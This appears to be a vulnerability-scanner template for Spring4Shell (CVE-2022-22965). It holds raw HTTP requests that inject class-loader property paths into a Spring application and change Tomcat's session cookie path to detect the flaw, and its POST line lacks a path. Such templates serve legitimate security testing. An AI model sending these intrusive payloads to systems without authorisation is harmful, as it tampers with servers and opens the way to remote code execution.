id: CVE-2022-22965

info:
  name: Spring Framework RCE via Data Binding on JDK 9+ (Spring4Shell)
  author: Str1am
  severity: critical
  reference:
    - https://tanzu.vmware.com/security/cve-2022-22965
    - https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/
  tags: cve,cve2022,rce,spring,injection,intrusive

requests:
  - raw:

      - |
        GET /?class.module.class.module.class.module.class.module.classLoader.aaa=aaa HTTP/1.1
        Host: {{Hostname}}

      - |
        POST  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
 
        class.module.classLoader.resources.context.sessionCookiePath=/zzzzzzzzz
      


    matchers-condition: or
    matchers:
      - type: status
        status:
          - 500
          - 400
      - type: word
        words:
          - "zzzzzzzzz"
        part: header
        condition: and